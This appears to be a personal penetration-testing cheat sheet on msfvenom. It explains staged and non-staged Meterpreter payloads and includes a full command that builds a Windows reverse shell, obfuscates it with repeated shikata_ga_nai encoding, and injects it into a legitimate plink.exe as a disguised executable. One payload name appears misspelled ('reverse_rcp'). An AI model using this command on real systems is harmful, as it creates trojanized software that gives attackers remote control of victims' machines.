# msfvenom

## Resources

* [https://book.hacktricks.xyz/shells/shells/msfvenom](https://book.hacktricks.xyz/shells/shells/msfvenom)

## Non-Staged Shell

* shell is sent in one block
* catch it with metasploit multi-handler OR netcat

```bash
windows/meterpreter_reverse_tcp
#        ^stage one with all of the code
```

## Staged Shell

* shell is sent in pieces
* useful for small buffers when you need to divide up the payload
* Meterpreter is staged
* catch it with metasploit multi-handler but NOT with Netcat

```bash
windows/meterpreter/reverse_rcp 
#          ^stage one^stage two
```

## Inject Payload into Existing PE File

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e 
x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o 
shell.exe
```

## Search Msfvenom

```bash
msfvenom --list payloads | grep searchTerm
```

## Resources and Cheat Sheets

* [https://netsec.ws/?p=331](https://netsec.ws/?p=331)
* [https://burmat.gitbook.io/security/hacking/msfvenom-cheetsheet](https://burmat.gitbook.io/security/hacking/msfvenom-cheetsheet)
